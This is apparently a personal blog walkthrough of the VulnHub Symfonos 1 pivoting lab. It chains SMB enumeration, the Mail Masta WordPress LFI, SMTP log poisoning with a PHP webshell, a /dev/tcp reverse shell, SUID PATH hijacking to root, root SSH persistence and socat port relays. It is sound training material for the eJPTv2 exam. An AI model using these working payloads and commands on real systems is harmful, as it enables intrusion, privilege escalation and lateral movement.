Symfonos 1 is the first half of a two-machine **VulnHub** pivoting lab I built for eJPTv2 practice: it's the internet-facing host, and it bridges my attack network to an isolated internal one where [Symfonos 2](/posts/symfonos-2/) hides. This box alone is a clean chain — SMB null-session enumeration with a themed password hint, a **Mail Masta** WordPress LFI (**CVE-2016-10956**) turned into RCE via **SMTP log poisoning**, and a **PATH-hijacking** SUID binary for root — and then it becomes the launch point for the pivot. My own scripts and sessions are kept in full.

## Lab Setup

The lab is two VulnHub VMs in VirtualBox wired together to practise pivoting:

- **Symfonos 1** has two NICs — a **host-only** adapter (`192.168.56.0/24`, my host is `.1`) and an **internal** network (`10.0.0.0/24`).
- **Symfonos 2** has *only* the internal NIC, so it is invisible from my host. The only way to it is *through* Symfonos 1 — which is exactly what the Pivoting section below sets up.

An ARP scan on the host-only side finds Symfonos 1:

```bash
sudo arp-scan -I vboxnet0 --localnet
# 192.168.56.6   08:00:27:4e:f1:e8   PCS Systemtechnik GmbH
```

## Reconnaissance & Enumeration

### Port Scan

```bash
sudo nmap -p- -sCV 192.168.56.6 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6
25/tcp  open  smtp        Postfix smtpd (symfonos.localdomain; VRFY enabled)
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

SSH, an SMTP server, Apache, and Samba. SMB is the easiest thing to enumerate without credentials, so that's first.

### SMB — anonymous share and a password hint

A null session lists the shares. `anonymous` is world-readable, and `helios` ("Helios personal share") hints at a user we can't reach yet:

```bash
smbmap -u '' -p '' -H 192.168.56.6
#   print$      NO ACCESS   Printer Drivers
#   helios      NO ACCESS   Helios personal share
#   anonymous   READ ONLY
#   IPC$        NO ACCESS   IPC Service (Samba 4.5.16-Debian)
```

The `anonymous` share holds a single note from "Zeus":

```bash
smbclient \\\\192.168.56.6\\anonymous -N
smb: \> get attention.txt
```

```text
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
Next person I find using one of these passwords will be fired!
-Zeus
```

Three passwords, handed to us. I drop them into a `passwords.txt` and spray them with `netexec` — `zeus:epidioko` is valid (as Guest), and trying them against the `helios` share, **`helios:qwerty`** unlocks it:

```bash
cat passwords.txt
# epidioko
# qwerty
# baseball

netexec smb 192.168.56.6 -u zeus -p passwords.txt
# [+] \zeus:epidioko (Guest)

smbmap -u 'helios' -p 'qwerty' -H 192.168.56.6
#   helios   READ ONLY   Helios personal share       <-- now readable
```

```bash
smbclient \\\\192.168.56.6\\helios -U helios        # password: qwerty
smb: \> get research.txt
smb: \> get todo.txt
```

`research.txt` is Greek-mythology flavour, but `todo.txt` is the lead:

```text
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

### The WordPress site

`/h3l105` is a **WordPress 5.2.2** install, but it loads broken until I add its vhost — the page source references `symfonos.local`:

```bash
curl -s http://192.168.56.6/h3l105/ | grep "symfonos.local"
# <link rel='dns-prefetch' href='//symfonos.local' />
echo "192.168.56.6 symfonos.local" | sudo tee -a /etc/hosts
```

`wpscan` enumerates the plugins, and one is a gift — **Mail Masta 1.0**, vulnerable to an unauthenticated **Local File Inclusion** (CVE-2016-10956):

```bash
wpscan --url http://symfonos.local/h3l105/ -e u,vp
# [+] mail-masta ... Unauthenticated Local File Inclusion (LFI)  CVE-2016-10956
# [+] site-editor ... Local File Inclusion (LFI)  CVE-2018-7422
# [+] admin  (user)
```

## Initial Access — Mail Masta LFI + SMTP Log Poisoning (CVE-2016-10956)

The exploit (EDB 40290) documents the vulnerable parameter — `count_of_send.php?pl=` passes straight into `include()`:

```bash
curl 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
# root:x:0:0:root:/root:/bin/bash
# ...
# helios:x:1000:1000:,,,:/home/helios:/bin/bash
```

`helios` has no SSH keys to steal, so instead of reading static files I turn the LFI into **RCE via log poisoning**. The include renders whatever file I point it at as PHP, and I can *write* to `helios`'s mail spool by sending him mail — so I put a PHP webshell in the message body over a hand-typed SMTP session:

```text
└─❯ telnet 192.168.56.6 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: Ander
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<pre> <?php system($_GET['cmd']); ?> </pre>
.
250 2.0.0 Ok: queued as 0D7F6406AE
```

Including the mail spool now executes the payload, and `cmd` runs commands:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=ls+-l'
# ... <pre> total 112
# -rwxr-xr-x 1 helios helios 8126 Jun 28 2019 ajax_camp_send.php ...
```

RCE confirmed. I URL-encode a Bash reverse shell into `cmd` and catch it:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.1%2F4444%200%3E%261%27'
```

```bash
nc -nlvp 4444
Connection received on 192.168.56.6 43112
helios@symfonos:~$      # the web server runs as helios
```

A shell as **`helios`** (after the TTY upgrade).

## Privilege Escalation — `helios` → `root` (SUID `statuscheck` PATH hijacking)

The SUID hunt returns a custom binary in `/opt`:

```bash
helios@symfonos:/opt$ find / -perm -4000 2>/dev/null
/opt/statuscheck
```

`strings` reveals what it does — it calls `curl` with a **relative path**, not `/usr/bin/curl`:

```bash
helios@symfonos:/opt$ strings statuscheck
# ...
# system
# curl -I H
# http://lH
# ocalhostH
```

A SUID binary that runs `curl` by name is a textbook **PATH hijack**: I put my own `curl` earlier in `PATH`, and the root-owned binary runs *mine* as root. My `curl` simply sets the SUID bit on bash:

```bash
helios@symfonos:/tmp$ cat curl
chmod u+s /bin/bash
helios@symfonos:/tmp$ chmod +x curl
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/opt$ ./statuscheck
helios@symfonos:/opt$ ls -la /bin/bash
# -rwsr-xr-x 1 root root 1099016 May 15 2017 /bin/bash
```

With bash now SUID-root, `-p` preserves the elevated privileges:

```bash
helios@symfonos:/opt$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/proof.txt
# Congrats on rooting symfonos:1!   (ASCII art trimmed)
```

Root on Symfonos 1.

## Pivoting to Symfonos 2

As root, `ip a` shows the second interface — `enp0s8` on the internal `10.0.0.0/24`, the network Symfonos 2 lives on:

```bash
bash-4.4# ip a | grep -A2 enp0s8
# enp0s8: ... inet 10.0.0.102/24 ... scope global enp0s8
```

First I set up persistence so I don't depend on the fragile reverse shell — generate a key as root and drop my host's public key into `/root/.ssh/authorized_keys`, then I can `ssh root@symfonos.local` whenever I want. A ping sweep then finds the neighbour:

```bash
bash-4.4# for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.102 up   (symfonos1 itself)
# 10.0.0.103 up   (symfonos2)
```

There's no nmap on the box, so I use a small Bash `/dev/tcp` port scanner against Symfonos 2:

```bash
# portScan.sh
IP=10.0.0.103

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/$IP/$port" 2>/dev/null && echo "[+] Host $IP - Port $port (OPEN)" &
done
```

```bash
bash-4.4# ./portScan.sh
# [+] Host 10.0.0.103 - Port 21 (OPEN)
# [+] Host 10.0.0.103 - Port 22 (OPEN)
# [+] Host 10.0.0.103 - Port 80 (OPEN)
# [+] Host 10.0.0.103 - Port 139 (OPEN)
# [+] Host 10.0.0.103 - Port 445 (OPEN)
```

Then I forward every one of those ports *outward* through Symfonos 1 with `socat`, so my host can reach Symfonos 2's services on `192.168.56.6` at a `100xx` port — each `socat` listens here and connects onward to `10.0.0.103`:

```bash
# pivot.sh
socat TCP-LISTEN:10021,reuseaddr,fork TCP-CONNECT:10.0.0.103:21 &
socat TCP-LISTEN:10022,reuseaddr,fork TCP-CONNECT:10.0.0.103:22 &
socat TCP-LISTEN:10080,reuseaddr,fork TCP-CONNECT:10.0.0.103:80 &
socat TCP-LISTEN:10139,reuseaddr,fork TCP-CONNECT:10.0.0.103:139 &
socat TCP-LISTEN:10445,reuseaddr,fork TCP-CONNECT:10.0.0.103:445 &
```

With those relays running, the rest of the lab happens against the hidden machine — continue in the **[Symfonos 2](/posts/symfonos-2/)** writeup.

## Key Takeaways

- **A password policy notice is a wordlist.** Zeus's "stop using `epidioko`/`qwerty`/`baseball`" note *was* the credential set — spraying those three with `netexec` unlocked the `helios` share. Password hints, banners and policy files are enumeration gold.
- **LFI becomes RCE wherever you can write a log.** Mail Masta only *included* files, but the mail spool is a file I can write to by sending mail — a hand-typed SMTP message with PHP in the body turned CVE-2016-10956 into command execution. Mail, auth and web logs are all candidates.
- **A relative command in a SUID binary is root.** `statuscheck` calling `curl` by name let me shadow it via `PATH` and run my own code as root. Any SUID program that invokes another binary without an absolute path is a PATH-hijack primitive — `strings` finds them fast.
- **A dual-homed host is a gateway.** The moment `ip a` showed a second NIC on `10.0.0.0/24`, Symfonos 1 stopped being the target and became the *route* to the next one. Enumerate every interface on every host you own; a quiet second NIC is the whole point of a pivot lab.
